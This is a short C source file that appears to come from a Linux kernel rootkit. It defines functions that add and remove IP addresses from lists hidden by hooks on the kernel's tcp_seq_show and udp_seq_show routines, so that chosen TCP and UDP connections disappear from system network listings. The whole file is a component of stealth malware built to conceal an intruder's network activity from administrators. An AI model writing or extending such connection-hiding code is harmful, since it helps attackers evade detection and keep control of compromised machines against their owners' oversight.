#include "hideip.h"
#include "../hooker/tcp_seq_show.h"
#include "../hooker/udp_seq_show.h"

void hide_tcp_ip(char *content)
{
    add_hidden_tcp_ip(content);
}

void show_hidden_tcp_ip(char *content)
{
    remove_hidden_tcp_ip(content);
}

void hide_udp_ip(char *content)
{
    add_hidden_udp_ip(content);
}

void show_hidden_udp_ip(char *content)
{
    remove_hidden_udp_ip(content);
}
